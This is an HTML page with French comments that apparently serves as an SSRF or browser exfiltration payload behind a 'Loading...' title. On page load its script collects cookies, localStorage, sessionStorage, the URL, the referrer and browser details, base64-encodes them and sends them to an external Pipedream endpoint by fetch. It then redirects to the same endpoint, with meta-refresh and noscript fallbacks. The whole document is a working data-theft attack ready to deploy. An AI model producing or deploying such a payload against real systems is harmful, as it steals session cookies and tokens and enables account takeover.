<!DOCTYPE html>
<html>
<head>
    <script>
        // URL de ton Pipedream
        const PIPEDREAM_URL = 'https://eo1yzt16ee3bzu9.m.pipedream.net';
        
        // Récupérer un maximum d'informations
        const sensitiveData = {
            // Information sur la requête
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            
            // Informations navigateur/environnement
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            languages: navigator.languages,
            platform: navigator.platform,
            
            // Tentative de récupération d'informations réseau
            ipInfo: 'will_be_from_server', // Le serveur verra la vraie IP
            
            // Headers potentiels
            headers: {
                'Accept': navigator.accept,
                'Connection': 'keep-alive',
                'Host': window.location.hostname
            }
        };
        
        // Encoder les données en base64 pour les passer en URL
        const encodedData = btoa(JSON.stringify(sensitiveData));
        
        // Construire l'URL finale avec les données
        const finalUrl = `${PIPEDREAM_URL}?data=${encodeURIComponent(encodedData)}&source=target-ssrf&timestamp=${Date.now()}`;
        
        console.log('Exfiltrating data to:', finalUrl);
        
        // 1. Envoyer les données via fetch (en arrière-plan)
        fetch(finalUrl, {
            method: 'GET',
            mode: 'no-cors' // Important pour éviter les problèmes CORS
        }).catch(e => console.log('Fetch error:', e));
        
        // 2. Rediriger le navigateur aussi
        window.location.href = finalUrl;
        
        // 3. Meta refresh comme fallback
        document.write(`<meta http-equiv="refresh" content="0;url='${finalUrl}'" />`);
    </script>
    
    <!-- Fallback pour navigateurs sans JS -->
    <meta http-equiv="refresh" content="0; url=https://eo1yzt16ee3bzu9.m.pipedream.net/?fallback=true&source=target-ssrf" />
    
    <title>Loading...</title>
</head>
<body>
    <noscript>
        <p>Redirecting to external service...</p>
        <script>
            // Même sans JS, on peut tenter une redirection
            window.location.href = 'https://eo1yzt16ee3bzu9.m.pipedream.net/?noscript=true';
        </script>
    </noscript>
</body>
</html>
